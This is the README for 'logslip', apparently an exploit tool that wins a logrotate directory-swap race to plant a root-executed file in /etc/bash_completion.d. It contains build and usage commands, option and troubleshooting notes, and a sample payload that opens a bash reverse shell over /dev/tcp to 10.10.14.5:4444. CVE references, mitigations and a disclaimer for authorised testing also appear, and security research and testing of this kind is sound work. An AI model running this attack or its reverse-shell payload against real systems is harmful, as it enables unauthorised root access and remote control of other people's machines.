# logslip - logrotate directory-swap race for local root

`logrotate` runs as root and rotates a log an unprivileged user owns. It renames
the log and then recreates it, and in the gap between those two steps the
directory the log lives in can be swapped for a symlink, so root creates the new
file wherever the symlink points. Dropped into `/etc/bash_completion.d`, that
file runs as root on the next interactive root login.

This is the race Wolfgang Hotwagner found and automated in
[logrotten](https://github.com/whotwagner/logrotten). logslip is
a rewrite with a single atomic swap and a busy-spin reactor, plus a `--probe` mode that tells you whether
a target is exploitable before you fire at it.

It is a local privilege-escalation technique, not a CVE. The vulnerability lives
in whatever ships the insecure logrotate setup; the canonical real-world
instance is CVE-2019-10143 (FreeRADIUS).

## Usage

```bash
gcc -O2 -Wall -Wextra -o logslip logslip.c      # or: make

./logslip --probe /home/user/backups/access.log   # is it exploitable, and how?
./logslip -p payload /home/user/backups/access.log # race it
```

Point it at the log an attacker-owned directory holds, the one root's logrotate
rotates. `--probe` watches one rotation and reports the mode, the period, and
whether the recreated file comes back writable. Run it with a payload and wait; 
it keeps attempting until it wins or `-a` runs out.

A payload is a shell fragment sourced as root. Guard it so it only fires for
root and, ideally, removes itself:

```bash
cat > payload <<'EOF'
if [ "$(id -u)" = 0 ]; then
    rm -f /etc/bash_completion.d/access.log
    (bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &)
fi
EOF
```

### Options

```
-p, --payload <file>    file whose contents are dropped as root
-t, --targetdir <dir>   directory to hijack (default /etc/bash_completion.d)
-a, --attempts <n>      attempts before giving up, 0 = forever (default 40)
-d, --decoys <n>        optional early-warning decoy rotated files (default 0)
-T, --trigger           append to the log each attempt to force a rotation
-w, --wait <ms>         window to wait for root's create (default 400)
    --probe             detect rotation mode / period / writability and exit
-q, --quiet             only print the outcome
-h, --help              this help
```

`-T` keeps the log non-empty so `notifempty` configs rotate it; leave it off if
root's own driver already fills the log. `-d` exists but defaults off: the
decoys are an early-warning lever that did not help measurably under the
busy-spin loop. The target directory and payload-file path have the usual
meaning from logrotten.

## Requirements

A C compiler on the target, or build elsewhere for the same architecture. Linux,
`renameat2(RENAME_EXCHANGE)` (3.15+), and inotify. No non-standard libraries.

## When it does not work

- **`no rotation within window`** - root is not rotating the log. The usual
  cause is the log's directory being group- or world-writable: root's logrotate
  refuses a log in an insecure directory and skips it silently. The directory is
  yours, so set it back to `0755`; logslip does this itself at startup. Also
  check the log is non-empty (`notifempty`) and that root's cron actually runs
  logrotate on this path.
- **`file created but not attacker-writable`** - you won the swap, but the
  `create` directive makes the new file root-owned, so the payload write is
  refused. `--probe` reports this up front.
- **copytruncate** - no rename happens, so the directory-swap race does not
  apply. `--probe` names the mode.
- **compress** - the file root creates is the `.gz`, not the log, so `-p` does
  not deliver a runnable payload; you get an arbitrary `.gz` write instead.

## Affected setups

| Field | Value |
|---|---|
| Class | logrotate rename->create directory-swap race (CWE-362, TOCTOU) |
| Technique | Wolfgang Hotwagner, logrotten |
| Canonical instances | CVE-2019-10143 (FreeRADIUS), CVE-2016-1247 (Debian nginx) |
| Preconditions | attacker-owned log directory, not group/world-writable; root-run logrotate with `create`; no `su` directive |
| Target written | any directory root can reach, e.g. `/etc/bash_completion.d`, `/etc/cron.d` |
| Mitigation | `su <user> <group>` in the config; root-owned non-writable log dirs; SELinux or AppArmor |

There is no logrotate CVE for this; the program is behaving as configured. The
CVEs are against the applications that ship the insecure setup.

## Origin

| Role | Who |
|---|---|
| **Technique and first PoC** | [Wolfgang Hotwagner](https://github.com/whotwagner/logrotten), logrotten |
| **Canonical real-world instance** | CVE-2019-10143 (FreeRADIUS); CVE-2016-1247 (Dawid Golunski, Debian nginx) |
| **This implementation** | [d4ytox](https://github.com/d4ytox) |

## References

- [Wolfgang Hotwagner, "Abusing a race condition in logrotate to elevate privileges"](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
- [whotwagner/logrotten](https://github.com/whotwagner/logrotten) - the original PoC
- [NVD - CVE-2019-10143](https://nvd.nist.gov/vuln/detail/CVE-2019-10143) - FreeRADIUS, the canonical instance
- [NVD - CVE-2016-1247](https://nvd.nist.gov/vuln/detail/CVE-2016-1247) - Debian nginx, Dawid Golunski
- [logrotate(8)](https://man7.org/linux/man-pages/man8/logrotate.8.html) - the `su` directive and the insecure-directory check
- [renameat2(2)](https://man7.org/linux/man-pages/man2/rename.2.html) - `RENAME_EXCHANGE`

## Licence

MIT, see [LICENSE](LICENSE). The grant covers this implementation. The race
condition is Hotwagner's research, credited in the file header and the Origin
table, and this is not a relicensing of logrotten.

## Legal

For authorised testing and research only. This drops a file that executes as
root on the target. Running it against a system you do not own, or do not have
written permission to test, is illegal in most places. Clean up what you drop:
the payload path is printed on a win, and the example payload removes itself.
